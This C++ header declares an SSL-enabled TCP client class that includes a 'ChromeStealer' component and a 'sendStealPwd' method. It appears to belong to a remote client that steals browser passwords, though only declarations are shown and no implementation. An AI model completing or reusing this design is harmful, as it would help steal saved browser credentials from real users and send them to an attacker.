#pragma once

#include <iostream>
#include <string>
#include <thread>
#include <queue>
#include <fstream>

#include <boost/asio.hpp>
#include <boost/asio/ssl.hpp>
#include <boost/bind.hpp>
#include <boost/lexical_cast.hpp>

#include "IClient.h"
#include "StaticTools.h"
#include "RequestHandler.h"
#include "ChromeStealer.h"

class TCPClient : public IClient
{
public:
	TCPClient(std::string const& remote, std::string const& port);
	virtual ~TCPClient(void);

	virtual void connect(void);
	virtual void write(Packet* packet);
	virtual void disconnect(void);
	virtual void run(void);
	virtual bool isConnected(void) const;
	virtual IClient &operator<<(Packet *packet);
	virtual Packet *createPacket(PacketType type, std::string const& data);
	virtual void sendStealPwd(std::string const& ftpPort);

private:
	void read(void);
	void write(void);
	void handshake(void);

	void do_connect(boost::system::error_code const& ec, boost::asio::ip::tcp::resolver::iterator);
	void do_read(boost::system::error_code const& ec, size_t);
	void do_write(boost::system::error_code const& ec, size_t);
	void do_handshake(boost::system::error_code const& ec);

	void runThread(void);

	boost::asio::io_service _io_service;
	boost::asio::deadline_timer _timer;
	boost::asio::ip::tcp::resolver _resolver;
	boost::asio::ssl::context _context;
	boost::asio::ssl::stream<boost::asio::ip::tcp::socket> _socket;

	boost::asio::streambuf _read;
	std::queue<Packet *> _toWrites;

	bool _connected;
	RequestHandler _reqHandler;

	std::thread _runThread;

	std::string _remote;
	std::string _port;
};

